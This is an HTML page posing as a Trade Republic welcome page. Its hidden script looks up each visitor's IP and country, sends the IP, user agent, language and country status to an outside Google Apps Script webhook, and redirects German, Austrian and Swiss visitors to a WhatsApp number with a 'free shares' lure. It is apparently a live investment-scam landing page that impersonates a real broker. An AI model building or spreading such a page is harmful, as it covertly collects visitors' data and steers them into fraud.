<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Trade Republic – Willkommen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #ffffff;
      text-align: center;
      padding: 50px;
    }
    img {
      max-width: 120px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      color: #333;
    }
  </style>
</head>
<body>
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Trade_Republic_Logo.svg/512px-Trade_Republic_Logo.svg.png" alt="Trade Republic Logo">
  <h1 id="message">Willkommen bei Trade Republic</h1>

  <script>
    const allowedCountries = ['DE', 'AT', 'CH'];
    const webhookUrl = 'https://script.google.com/macros/s/AKfycbxUZUPpwihLRC4UVCPMDOFr64WfWhemdVxWwLqxXFhg2U6w0uBfz5Bl5KKO5w3ipgFP/exec';
    const redirectUrl = 'https://api.whatsapp.com/send/?phone=4915212163013&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos&type=phone_number&app_absent=0';

    
    const now = Date.now();
    let visits = JSON.parse(localStorage.getItem('visit_log') || '[]');
    visits = visits.filter(ts => now - ts < 2 * 60 * 1000); // 2分钟内
    visits.push(now);
    localStorage.setItem('visit_log', JSON.stringify(visits));

    if (visits.length > 20) {
      document.getElementById("message").innerText = "Zugriff blockiert: Verdächtige Aktivität erkannt.";
      throw new Error("Blocked due to too many requests.");
    }

    
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        const country = data.country;
        const ip = data.ip;
        const device = navigator.userAgent;
        const language = navigator.language || navigator.userLanguage;
        const isValid = allowedCountries.includes(country);
        const status = isValid ? 'valid' : 'invalid';

        
        fetch(webhookUrl, {
          method: 'POST',
          body: JSON.stringify({
            country: country,
            ip: ip,
            device: device,
            language: language,
            time: new Date().toISOString(),
            status: status
          }),
          headers: {
            'Content-Type': 'application/json'
          }
        });

       
        if (isValid) {
          document.getElementById("message").innerText = "Willkommen! Sie werden weitergeleitet...";
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 1500);
        } else {
          document.getElementById("message").innerText = "Nur für Besucher aus Deutschland, Österreich und der Schweiz verfügbar.";
        }
      })
      .catch(err => {
        document.getElementById("message").innerText = "Netzwerkfehler. Bitte versuchen Sie es später erneut.";
      });
  </script>
</body>
</html>
